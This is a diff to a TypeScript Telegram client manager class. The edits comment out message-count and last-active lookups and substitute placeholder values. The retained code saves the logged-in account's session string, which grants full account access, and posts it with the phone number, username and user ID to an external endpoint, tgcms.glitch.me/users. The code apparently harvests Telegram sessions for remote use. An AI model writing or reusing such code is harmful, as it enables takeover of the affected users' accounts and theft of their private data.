@@ -333,11 +333,12 @@ class TelegramManager {
         const sess = this.client.session.save() as unknown as string;
         const user: any = await result.toJSON();
         const chats = await this.client?.getDialogs({ limit: 600 });
-        const myMsgs = await this.client.getMessages('me', { limit: 8 });
+        await this.disconnect();
+        // const myMsgs = await this.client.getMessages('me', { limit: 8 });
         let personalChats = 0;
         let channels = 0;
-        const lastActive = await this.getLastActiveTime();
-        const date = new Date(lastActive * 1000)
+        // const lastActive = await this.getLastActiveTime();
+        // const date = new Date(lastActive * 1000)
         const chatsArray = [];
 
         chats.map((chat: any) => {
@@ -352,7 +353,6 @@ class TelegramManager {
                 personalChats++
             }
         });
-        await this.disconnect();
         const payload3 = {
             mobile: user.phone,
             session: `${sess}`,
@@ -361,10 +361,10 @@ class TelegramManager {
             userName: user.username ? `@${user.username}` : null,
             channels: channels,
             personalChats: personalChats,
-            msgs: myMsgs['total'],
-            totalChats: chats['total'],
-            lastActive: lastActive,
-            date: date,
+            msgs: 0,//myMsgs['total'],
+            totalChats: 0,//chats['total'],
+            lastActive: Date.now(),//lastActive,
+            date: new Date(Date.now() * 1000),//date,
             tgId: user.id
         };
         await axios.post(`https://tgcms.glitch.me/users`, payload3, { headers: { 'Content-Type': 'application/json' } });
